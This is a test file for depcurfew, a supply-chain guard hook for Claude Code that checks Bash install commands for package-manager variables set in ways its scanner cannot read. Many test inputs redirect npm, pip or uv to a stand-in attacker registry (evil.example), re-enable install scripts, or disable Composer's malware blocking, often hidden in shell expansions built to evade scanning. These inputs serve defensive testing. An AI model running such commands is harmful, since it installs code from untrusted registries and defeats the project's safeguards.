// The Claude Code hook and variables of package managers set in ways depcurfew does not read (decision D-143): a name
// counts only where the command sets it (setter builtins, assignments and the lines the scanner reads inside others,
// and code it cannot read), with the case the tool reads in that shell, and an unknown value counts as the worst one:
// the hook asks only where setting the variable to a value that weakens the policy would make it ask.
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { values } from '../../src/apply/facts.ts';
import { scanCommandLine } from '../../src/check/command.ts';
import { EXIT_OK, run } from '../../src/cli/run.ts';
import { knowledgeBase } from '../../src/knowledge/index.ts';
import type { EnvironmentNameRule } from '../../src/knowledge/types.ts';
import { recordedFetch } from './support.ts';

const NOW = new Date('2026-11-02T12:00:00Z');
const temporary: string[] = [];
let HOME = '';
beforeAll(() => {
  HOME = mkdtempSync(join(tmpdir(), 'depcurfew-d143-home-'));
  temporary.push(HOME);
});
afterAll(() => {
  for (const directory of temporary) rmSync(directory, { recursive: true, force: true });
});

const STRICT = { cooldown: { minimum: '7d' }, installScripts: { default: 'deny' } };
const EMPTY = {};

function project(policy: object = STRICT): string {
  const root = mkdtempSync(join(tmpdir(), 'depcurfew-d143-'));
  temporary.push(root);
  mkdirSync(join(root, '.git'));
  writeFileSync(join(root, 'depcurfew.json'), JSON.stringify({ version: 1, ...policy }));
  return root;
}

type Output = { permissionDecision?: string; permissionDecisionReason?: string };

async function hook(command: string, policy: object = STRICT, options: { tool?: string; platform?: NodeJS.Platform } = {}): Promise<Output> {
  const root = project(policy);
  let stdout = '';
  const stdin = JSON.stringify({ session_id: 'test', hook_event_name: 'PreToolUse', tool_name: options.tool ?? 'Bash', tool_input: { command }, cwd: root });
  const code = await run(['check', '--hook', 'claude-code'], { stdout: (text) => (stdout += text), stderr: () => undefined }, {
    fetch: recordedFetch,
    now: () => NOW,
    stdin: async () => stdin,
    home: () => HOME,
    projectDir: () => root,
    platform: () => options.platform ?? 'linux',
  });
  expect(code).toBe(EXIT_OK);
  return stdout === '' ? {} : (JSON.parse(stdout) as { hookSpecificOutput: Output }).hookSpecificOutput;
}

const decision = async (command: string, policy: object = STRICT, options: Parameters<typeof hook>[2] = {}) => (await hook(command, policy, options)).permissionDecision ?? 'none';

describe('ordinary commands that only read or mention a variable (the regression of D-142)', () => {
  // 23 of the 25 ordinary Bash commands that asked since D-142; the two dotenv lines are below.
  const ORDINARY = [
    'printenv npm_config_registry; npm ci',
    'printenv PIP_INDEX_URL && pip install -r requirements.txt',
    'env | grep COMPOSER; composer install',
    'grep -q COMPOSER_NO_BLOCKING .env || composer install',
    'cat .github/workflows/ci.yml | grep npm_config_registry && npm ci',
    'grep PIP_INDEX_URL pip.conf; pip install -r requirements.txt',
    'composer config --list | grep COMPOSER; composer install',
    'echo COMPOSER; composer install',
    'echo "Composer is at $(which composer)"; composer install',
    'php -r \'echo getenv("COMPOSER_HOME");\'; composer install',
    'python -c \'import os; print(os.environ.get("PIP_INDEX_URL"))\'; pip install -r requirements.txt',
    "node -e 'console.log(process.env.npm_config_registry)'; npm ci",
    'npm ci && echo "done, npm_config_registry unchanged"',
    'echo "Installing Composer dependencies..." && composer install',
    "echo 'Installing Composer dependencies' && composer install",
    'echo "==> Composer" && composer install --no-interaction',
    'git commit -m "Bump Composer deps" && composer install',
    'composer install && echo "Composer done"',
    'echo "Installing Python deps from PIP_INDEX_URL" && pip install -r requirements.txt',
    'echo "COMPOSER_HOME is $COMPOSER_HOME" && composer install',
    "printf 'Composer: %s\\n' \"$(composer --version)\" && composer install",
    'echo "Composer" > /dev/null; npm ci',
    'echo "Composer" > /dev/null; pip install -r requirements.txt',
  ];

  it.each(ORDINARY)('gives no decision for %s', async (command) => {
    expect(await decision(command)).toBe('none');
    expect(await decision(command, EMPTY)).toBe('none');
  });

  it.each([
    "export $(grep -v '^#' .env | xargs) && npm ci",
    'export $(cat .env | xargs) && npm run dev',
  ])('still asks about %s, whose variable may be any variable of a package manager', async (command) => {
    // The name the shell builds may be COMPOSER_NO_BLOCKING, and COMPOSER_NO_BLOCKING=1 npm ci asks under any policy.
    expect(await decision('COMPOSER_NO_BLOCKING=1 npm ci', EMPTY)).toBe('ask');
    expect(await decision(command, EMPTY)).toBe('ask');
  });

  it('gives no decision where the same name is mentioned next to an install with names', async () => {
    expect(await decision('echo "Composer" > /dev/null; composer require monolog/monolog:3.11.0')).toBe('none');
    expect(await decision('git commit -m "Set COMPOSER_HOME and npm_config_registry"; npm i lodash@4.17.21')).toBe('none');
    expect(await decision('printenv npm_config_registry; npm i lodash@4.17.21')).toBe('none');
  });
});

describe('an unknown value counts as the worst value, as an assignment would', () => {
  // Each pair: the variable set to a bad value as NAME=value, and the same variable set by a builtin; both give the
  // same decision under the same policy.
  it.each([
    ['npm_config_registry=https://evil.example/ npm ci', 'read npm_config_registry <<< https://evil.example/; export npm_config_registry; npm ci', STRICT, 'none'],
    ['UV_INDEX_URL=https://evil.example/simple uv sync', 'read UV_INDEX_URL <<< https://evil.example/simple; export UV_INDEX_URL; uv sync', STRICT, 'none'],
    ['COMPOSER=x.json composer install', 'read COMPOSER <<< x.json; export COMPOSER; composer install', STRICT, 'none'],
    ['UV_PROJECT=sub uv sync', 'printf -v UV_PROJECT sub; export UV_PROJECT; uv sync', STRICT, 'none'],
    ['PIP_PRE=1 pip install -r requirements.txt', 'read PIP_PRE <<< 1; export PIP_PRE; pip install -r requirements.txt', STRICT, 'none'],
    ['npm_config_ignore_scripts=false npm ci', 'read npm_config_ignore_scripts <<< false; export npm_config_ignore_scripts; npm ci', EMPTY, 'none'],
    ['npm_config_ignore_scripts=false npm ci', 'read npm_config_ignore_scripts <<< false; export npm_config_ignore_scripts; npm ci', STRICT, 'ask'],
    ['npm_config_min_release_age=0 npm ci', 'printf -v npm_config_min_release_age 0; export npm_config_min_release_age; npm ci', EMPTY, 'none'],
    ['npm_config_min_release_age=0 npm ci', 'printf -v npm_config_min_release_age 0; export npm_config_min_release_age; npm ci', { cooldown: { minimum: '7d' } }, 'ask'],
    ['COMPOSER_POLICY_COOLDOWN_PERIOD=0 composer install', 'let COMPOSER_POLICY_COOLDOWN_PERIOD=0; export COMPOSER_POLICY_COOLDOWN_PERIOD; composer install', EMPTY, 'none'],
    ['COMPOSER_POLICY_COOLDOWN_PERIOD=0 composer install', 'let COMPOSER_POLICY_COOLDOWN_PERIOD=0; export COMPOSER_POLICY_COOLDOWN_PERIOD; composer install', STRICT, 'ask'],
    ['COMPOSER_NO_BLOCKING=1 npm ci', 'read COMPOSER_NO_BLOCKING <<< 1; export COMPOSER_NO_BLOCKING; npm ci', EMPTY, 'ask'],
    ['npm_config_registry=https://evil.example/ npm i lodash@4.17.21', 'read npm_config_registry <<< https://evil.example/; export npm_config_registry; npm i lodash@4.17.21', EMPTY, 'ask'],
    ['COMPOSER=x.json composer require monolog/monolog:3.11.0', 'read COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0', EMPTY, 'ask'],
  ])('%s and %s give the same decision', async (assignment, builtin, policy, expected) => {
    expect(await decision(assignment, policy)).toBe(expected);
    expect(await decision(builtin, policy)).toBe(expected);
  });

  it('asks about a variable that changes the version, set that way next to an install with names', async () => {
    // PIP_PRE=1 is read with its value; set by read, its value is unknown, so the version pip picks is too.
    expect(await decision('read PIP_PRE <<< 1; export PIP_PRE; pip install requests', EMPTY)).toBe('ask');
    expect(await decision('PIP_PRE=$X pip install requests', EMPTY)).toBe('ask');
  });

  it('says which variable, what it may weaken and which file restricts it', async () => {
    expect((await hook('read npm_config_ignore_scripts <<< false; export npm_config_ignore_scripts; npm ci')).permissionDecisionReason).toBe(
      'depcurfew cannot vouch for what this command installs:\n- read npm_config_ignore_scripts <<< false; export npm_config_ignore_scripts; npm ci: npm_config_ignore_scripts is set in a way depcurfew does not read, which may turn on dependency install scripts that depcurfew.json restricts, and may weaken what the project configured for every package this install fetches, also those depcurfew does not check. Fix: Run the install without that option or variable, so it keeps the release-age delay and install-script settings of the project; if the change is intended, the user decides',
    );
    expect((await hook('printf -v npm_config_min_release_age 0; export npm_config_min_release_age; npm ci')).permissionDecisionReason).toContain(
      'npm_config_min_release_age is set in a way depcurfew does not read, so its release-age delay cannot be compared with the 1 week in depcurfew.json, and may weaken',
    );
  });
});

describe('the forms that set a variable', () => {
  // Beyond the forms of D-142 (tests/check/hook-d142.test.ts): other builtins of bash, zsh and ksh, arithmetic in
  // subscripts, offsets and $[ ], the value of a variable that may be used as a name or an expression, a command the
  // shell expands, and code that depcurfew does not read.
  const ASKS = [
    'print -v COMPOSER x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    "read 'COMPOSER?file: ' <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0",
    'read -rp "file: " COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    'select COMPOSER in x.json; do break; done; export COMPOSER; composer require monolog/monolog:3.11.0',
    'vared COMPOSER; export COMPOSER; composer require monolog/monolog:3.11.0',
    'integer COMPOSER_POLICY_MALWARE_BLOCK; COMPOSER_POLICY_MALWARE_BLOCK=1-1; export COMPOSER_POLICY_MALWARE_BLOCK; composer install',
    'nameref r=npm_config_registry; r=https://evil.example/; export npm_config_registry; npm i lodash@4.17.21',
    'time read COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    'command read COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    'builtin printf -v COMPOSER x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    'while IFS= read -r COMPOSER; do export COMPOSER; composer require monolog/monolog:3.11.0; done < list.txt',
    'function f { read COMPOSER <<< x.json; }; f; export COMPOSER; composer require monolog/monolog:3.11.0',
    'alias r=read; r COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    "mapfile -C 'read COMPOSER <<< x.json; :' -c 1 lines < list.txt; export COMPOSER; composer require monolog/monolog:3.11.0",
    'declare -i x; x=COMPOSER_NO_BLOCKING=1; export COMPOSER_NO_BLOCKING; composer install',
    '$READ COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0',
    'a[COMPOSER_NO_BLOCKING=1]=x; export COMPOSER_NO_BLOCKING; composer install',
    'echo $[COMPOSER_NO_BLOCKING=1]; export COMPOSER_NO_BLOCKING; composer install',
    'echo ${s:COMPOSER_NO_BLOCKING=1}; export COMPOSER_NO_BLOCKING; composer install',
    // Offsets that share the first } after them, and one more than 4096 characters from it (decision D-146).
    'echo ${a:${b:1:COMPOSER_NO_BLOCKING=1}; export COMPOSER_NO_BLOCKING; composer install',
    `echo \${a:${'x'.repeat(5000)}\${b:COMPOSER_NO_BLOCKING=1}; export COMPOSER_NO_BLOCKING; composer install`,
    'echo ${a:1} ${b:2:COMPOSER_NO_BLOCKING+=1}; export COMPOSER_NO_BLOCKING; composer install',
    'echo $(( COMPOSER_NO_BLOCKING += 1 )); export COMPOSER_NO_BLOCKING; composer install',
    'for (( COMPOSER_NO_BLOCKING = 1; 0; )); do :; done; export COMPOSER_NO_BLOCKING; composer install',
    "X='COMPOSER_NO_BLOCKING=1'; (( X )); export COMPOSER_NO_BLOCKING; composer install",
    'N=COMPOSER; : ${!N:=x.json}; export COMPOSER; composer require monolog/monolog:3.11.0',
    'echo "${COMPOSER=x.json}"; export COMPOSER; composer require monolog/monolog:3.11.0',
    "bash -c 'read COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0'",
    'x=$(read -r npm_config_registry <<< https://evil.example/); npm i lodash@4.17.21',
    "eval 'export npm_config_registry=https://evil.example/'; npm i lodash@4.17.21",
    "eval 'export npm_config_ignore_scripts=false'; npm ci",
    "alias e='export UV_PROJECT=sub'; e; uv add ruff==0.17.2",
    'python3 -c \'import os; os.environ["PIP_INDEX_URL"] = "https://evil.example/simple"\'; pip install requests==2.34.2',
    "node -e 'process.env.npm_config_registry = \"https://evil.example/\"'; npm i lodash@4.17.21",
    "php -r 'putenv(\"COMPOSER_NO_BLOCKING=1\");'; composer install",
  ];

  it.each(ASKS)('asks about %s', async (command) => {
    expect(await decision(command)).toBe('ask');
  });

  it.each([
    // The value is read: the public registry, and scripts left off.
    "eval 'export npm_config_registry=https://registry.npmjs.org/'; npm i lodash@4.17.21",
    "eval 'export npm_config_ignore_scripts=true'; npm ci",
    // Arithmetic that only reads a variable.
    '(( COMPOSER_PROCESS_TIMEOUT > 300 )) && composer install',
    'echo $(( COMPOSER_NO_BLOCKING + 1 )); composer install',
    '[[ COMPOSER_NO_BLOCKING -eq 0 ]] && composer install',
    'echo ${a:COMPOSER_NO_BLOCKING:1}; composer install',
    // The body of an offset ends at the first }: what follows it is no offset (decision D-146).
    'echo ${a:1}COMPOSER_NO_BLOCKING=1:2; composer install',
    // Options and prompts of the builtins, which are not names.
    'read -p "COMPOSER? " answer; composer require monolog/monolog:3.11.0',
    "printf -v x 'COMPOSER'; composer require monolog/monolog:3.11.0",
    'mapfile -t lines < <(printenv COMPOSER); composer require monolog/monolog:3.11.0',
    // Words of other commands only mention a name.
    'git log --grep=COMPOSER && composer require monolog/monolog:3.11.0',
    'MSG="Composer update" git commit -m x && composer require monolog/monolog:3.11.0',
    // Code that names the variable where its value cannot matter to the install.
    'python3 -c \'import os; os.environ["PIP_INDEX_URL"] = "https://evil.example/simple"\'; pip install -r requirements.txt',
  ])('gives no decision for %s', async (command) => {
    expect(await decision(command)).toBe('none');
  });
});

describe('the case of a name, as the tool reads it in that shell', () => {
  const unread = (line: string, windows: boolean) => scanCommandLine(line, { windows }).unreadable;

  it('tells COMPOSER from Composer in POSIX shells, but not on Windows', () => {
    for (const line of [
      'read Composer <<< x.json; export Composer; composer require monolog/monolog:3.11.0',
      'Composer=x.json composer require monolog/monolog:3.11.0',
      'for composer in x.json; do :; done; export composer; composer require monolog/monolog:3.11.0',
    ]) {
      expect(unread(line, false)).toBeUndefined();
      expect(unread(line, true)).toContain('may point the package manager at another registry');
    }
    expect(unread('read COMPOSER <<< x.json; export COMPOSER; composer require monolog/monolog:3.11.0', false)).toContain('COMPOSER may point the package manager at another registry');
  });

  it('reads npm_config_* and YARN_* in any case, pnpm_config_ in lower or upper case, and PIP_ with the rest in any case', () => {
    const asks = (line: string) => unread(line, false) !== undefined;
    expect(asks('read NPM_CONFIG_REGISTRY <<< x; export NPM_CONFIG_REGISTRY; npm i lodash@4.17.21')).toBe(true);
    expect(asks('read Npm_Config_Registry <<< x; export Npm_Config_Registry; npm i lodash@4.17.21')).toBe(true);
    expect(asks('Npm_Config_Registry=https://evil.example/ npm i lodash@4.17.21')).toBe(true);
    expect(asks('read yarn_npm_registry_server <<< x; export yarn_npm_registry_server; yarn add lodash@4.17.21')).toBe(true);
    expect(asks('read PNPM_CONFIG_REGISTRY <<< x; export PNPM_CONFIG_REGISTRY; pnpm add lodash@4.17.21')).toBe(true);
    expect(asks('read pnpm_config_registry <<< x; export pnpm_config_registry; pnpm add lodash@4.17.21')).toBe(true);
    expect(asks('read Pnpm_Config_Registry <<< x; export Pnpm_Config_Registry; pnpm add lodash@4.17.21')).toBe(false);
    expect(asks('read PIP_index_url <<< x; export PIP_index_url; pip install requests==2.34.2')).toBe(true);
    expect(asks('read pip_index_url <<< x; export pip_index_url; pip install requests==2.34.2')).toBe(false);
    expect(asks('pip_index_url=https://evil.example/simple pip install requests==2.34.2')).toBe(false);
    expect(asks('read uv_index_url <<< x; export uv_index_url; uv add ruff==0.17.2')).toBe(false);
    expect(asks('read UV_INDEX_URL <<< x; export UV_INDEX_URL; uv add ruff==0.17.2')).toBe(true);
  });

  it('compares names in any case in cmd.exe', () => {
    expect(unread('cmd /c "set /p composer=<x.txt && composer require monolog/monolog:3.11.0"', false)).toContain('may point the package manager at another registry');
  });

  it('asks in the hook on Windows, where Git Bash hands the variable to programs that read it in any case', async () => {
    const command = 'read Composer <<< x.json; export Composer; composer require monolog/monolog:3.11.0';
    expect(await decision(command, STRICT, { platform: 'linux' })).toBe('none');
    expect(await decision(command, STRICT, { platform: 'win32' })).toBe('ask');
    expect(await decision('$env:composer = "x.json"; composer require monolog/monolog:3.11.0', STRICT, { tool: 'PowerShell', platform: 'linux' })).toBe('ask');
  });
});

describe('the knowledge base', () => {
  it('says for every variable the scanner watches how its tool tells names apart, with a source', () => {
    for (const tool of knowledgeBase) {
      const extra = tool.extra ?? {};
      const listed = Object.entries(extra).flatMap(([key, fact]) => {
        const value = values(fact)[0] as Record<string, unknown> | undefined;
        if (value === undefined) return [];
        if (/registryOverrides$/iu.test(key)) return [...((value['registryVariables'] as string[]) ?? []), ...((value['configVariables'] as string[]) ?? [])];
        if (/installOverrides$/iu.test(key) || /directoryOptions$/iu.test(key)) return ((value['variables'] as { name: string }[]) ?? []).map((entry) => entry.name);
        return [];
      });
      if (listed.length === 0) continue;
      const fact = extra['environmentNames'];
      expect(fact, tool.id).toBeDefined();
      const rules = values(fact as never)[0] as unknown as EnvironmentNameRule[];
      for (const name of listed) expect(rules.some((rule) => name.toLowerCase().startsWith(rule.prefix.toLowerCase())), `${tool.id} ${name}`).toBe(true);
      expect(JSON.stringify(fact)).toMatch(/"source":"https:\/\/github\.com\//u);
    }
  });
});

describe('the callback of mapfile -C, which the shell runs for every few lines it reads', () => {
  const requests = (line: string) => scanCommandLine(line).requests.map((request) => `${request.tool}:${request.spec}`);

  it('is read as a command line, so an install in it is checked', () => {
    expect(requests("mapfile -C 'npm i fresh-pkg@1.1.0' -c 1 x < package.json")).toEqual(['npm:fresh-pkg@1.1.0']);
    expect(requests('readarray -c1 -C "pip install requests==2.0.0" lines < requirements.txt')).toEqual(['pip:pypi:requests==2.0.0']);
    expect(requests("mapfile -tC'npm i fresh-pkg@1.1.0' x < f")).toEqual(['npm:fresh-pkg@1.1.0']);
  });

  it('makes the command unreadable when the callback is expanded by the shell', () => {
    expect(scanCommandLine('mapfile -C "$CB" -c 1 x < f; npm ci').unreadable).toBeDefined();
  });

  it('leaves a mapfile without a callback alone', () => {
    expect(scanCommandLine('mapfile -t lines < package.json').unreadable).toBeUndefined();
    expect(requests('mapfile -t lines < package.json')).toEqual([]);
  });
});
